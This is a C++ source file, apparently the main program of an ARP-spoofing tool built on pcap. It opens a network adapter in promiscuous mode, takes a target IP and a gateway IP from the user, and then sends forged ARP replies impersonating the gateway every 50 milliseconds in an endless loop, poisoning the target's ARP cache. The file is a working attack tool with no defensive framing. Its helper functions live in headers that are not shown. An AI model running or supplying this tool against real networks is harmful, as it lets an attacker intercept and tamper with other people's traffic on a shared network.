#include <iostream>
#include <vector>
#include <string>

#include <pcap.h>

#include "device_description.h"
#include "arp.h"

using namespace std;

int main()
{
    vector<string> device_name;
    getDevice(device_name);

    cout << endl;
    cout << "select your device( choose the right index , like 0..n ): " << endl;
    int num;
    cin >> num;
    if ( num > device_name.size()) {
        cerr << "you have select the wrong adapter " << endl;
        exit(1);
    }

    // open the output device
    pcap_t * fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    if ((fp = pcap_open(device_name[num].c_str(), 
                100, // capture the first 100 bytes
                PCAP_OPENFLAG_PROMISCUOUS, 
                1000, // read timeout
                NULL,
                errbuf)) == NULL) {
        cerr << "unable to open the adapter. " << endl;

        exit(1);
    }

    /* send a fake ARP reply */
    string gateway, target;
    ip_mac dst_ipmac;

    cout << endl
         << "please input the target ip: " << endl;
    cin >> target;
    cout << endl
         << "please input the gateway ip: " << endl;
    cin >> gateway;
    getmac(fp, dst_ipmac, target, gateway);


    while (1) {
        sendARPReply(fp, dst_ipmac, gateway);
        Sleep(50);
    }

    return 0;
}